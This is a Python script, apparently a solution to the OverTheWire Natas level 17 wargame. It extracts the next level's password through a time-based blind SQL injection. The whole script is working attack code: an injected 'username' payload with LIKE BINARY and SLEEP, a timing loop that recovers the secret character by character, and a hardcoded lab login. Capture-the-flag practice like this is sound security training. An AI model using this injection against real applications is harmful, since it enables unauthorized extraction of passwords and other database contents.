import sys
import time
import requests as req

url = "http://natas17.natas.labs.overthewire.org/index.php?debug"
username = "natas17"
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

chars = ""

for i in range(0, 26):
	chars += chr(ord("A") + i)
	chars += chr(ord("a") + i)

for i in range(0, 10):
	chars += str(i)

passwd = ""

i = 0
def test_passwd(username, password, url, passwd):
	#passwd = "a"
	query = "natas18\" AND password LIKE BINARY \"%" + passwd + """%\" AND
	SLEEP(0.2) #"""
	t0 = time.time_ns()
	r = req.post(url, auth=(username, password), data={"username": query})
	t1 = time.time_ns()
	total = (t1-t0) / 10**9
	print("%s = %f" % ("time", total))
	return total > 0.25

i = 0
while i < len(chars):
	s = chars[i]
	if test_passwd(username, password, url, passwd + s):
		passwd += s
		i = 0
		continue
	print(passwd)
	i += 1
i = 0
while i < len(chars):
	s = chars[i]
	if test_passwd(username, password, url, s + passwd):
		passwd = s + passwd
		i = 0
		continue
	print(passwd)
	i += 1
